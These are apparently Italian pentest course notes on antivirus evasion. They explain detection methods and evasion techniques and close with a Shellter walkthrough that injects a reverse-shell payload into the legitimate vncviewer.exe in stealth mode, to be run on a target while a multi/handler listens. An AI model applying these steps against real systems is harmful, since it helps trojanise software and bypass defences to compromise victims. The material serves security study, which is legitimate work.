
# AV Evesion
L'evasione dei sistemi di difesa consiste in un insieme di tecniche che vengono  utilizzate per evitare il rilevamento durante un attacco. <br>
Le tecniche usate incudono la disinstallazione/disabilitazione dei software di sicurezza (antivirus) o l'offuscamento/crittografia dei dati degli scripts. <br>
Tutto consiste nel cambiare o mascherare la firma degli script dannosi. <br>

Una firma é una sequenza di byte, o una stringa di testo univoca, che identifica in modo univoco dei malware, dei file o degli eseguibili malevoli.  

---

### AV Detection Methods
I software antivirus usano due tipi di analisi per individuare un codice malevolo: 
- analisi basata sulla firma: é il metodo di rilevazione piú antico e piú usato attualmente. Uno dei piú conosciuti é Windows Defender. <br>
consiste nella ricerca della firma del file su un database di firme che fanno riferimento a file malevoli. il miglior metodo é quello di inniettare un payload malevolo dentro un file legittimo in modo tale che la firma per quel payload sia la stessa del file legittimo. 

- analisi euristica: si basa su una serie di regole o decisioni per determinare se un binario o un eseguibile sia dannoso cercando dei modelli specifici dentro al codice del programma

- analisi basata sul comportamento: é molto efficiente contro i nuovi malware e si basa sul comportamento del file dando un occhiata a quali azioni compie il file per vedere se va a toccare i registri di windows o ha qualche comportamento sospetto cosí da segnalarlo come malevolo. 

---

### AV Evasion Methods
i metodi di evasione per i sistemi di sicurezza si dividono in: 
1. Evasione On-Disk
   - offuscamento: si riferisce al procedimento di occultamento di qualcosa di importante, prezioso o critico. Quello che fa é riorganizzare il codice in modo da non essere rilevato dai sistemi di rilevamento
   - codifica: é un processo che comporta la modifica dei dati in un nuovo formato utilizzando un precisco schemda di codifica. il vantaggio é che quando si codifica un codice con un determinato schema, esso é facilmente reversibile.
   - Packing: consiste nel generare un eseguibile con una nuova struttura binaria con una dimenzione piú piccola fornendo un payload con una nuova firma.
   - Cryptas: consiste nel crittografare il codice o il payload per poi decrittografarlo in memoria conservando la chiave di decrittografia dentro uno stub. 
   
2. Evasione On-Memory
   - si basano sulla manipolazione della memoria e non sul disco. Implica l'iniezione di payload in un processo sfruttando vari API di Windows e il payload viene eseguito in memoria in un file separato. 

---

## Shellter
Shellter é uno strumento dinamico che permette di infettare file eseguibili **32 bit** per sistemi **Windows x32/x64** con un payload, come ad esempio una reverse shell, senza alterare il normale funzionamento del programma originale. Si tratta di un cosiddetto injector polimorfico, capace di analizzare dinamicamente il codice dell’eseguibile per trovare i punti migliori in cui inserire il codice malevolo, rendendo l’operazione più difficile da individuare da parte degli antivirus tradizionali.

La documentazione si trova a questo <a href="https://www.shellterproject.com/introducing-shellter/">link</a>

per poterlo installare: 
```bash
sudo apt-get install shellter -y 
```
shellter é in realtá un eseguibile windows e per poterlo eseguire su linux dobbiamo usare `wine`. 
per installare wine: 
```bash
sudo dpkg --add-architecture i386
sudo apt-get install wine32
```
e cosí possiamo eseguire shellter su linux usando wine: 
```bash
cd /usr/share/windows-resources/shellter
ls -la
sudo wine shellter.exe
```
per poter inniettare shellter dentro un eseguibile windows possiamo andare nella cartelle `windows-binaries` su kali linux che include vari binari legittimi di windows per prendere il binario `vncviewer`: 
```bash
cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop
sudo wine shellter.exe
A
/home/kali/Desktop/vncviewer.exe
# dopo un pó di tempo ci verrá chiesto di abilitare la stealth mode
y
L
1
<LHOST>
<LPORT>
```
avremo cosí il nostro eseguibile modificato e quello che abbiamo dato a shellcode precedentemente verrá messo nelle sua cartella di backup.
ora dovremo solo avviare un multi handler con il payload impostato e far eseguire l'applicazione .exe modificata sul target. 
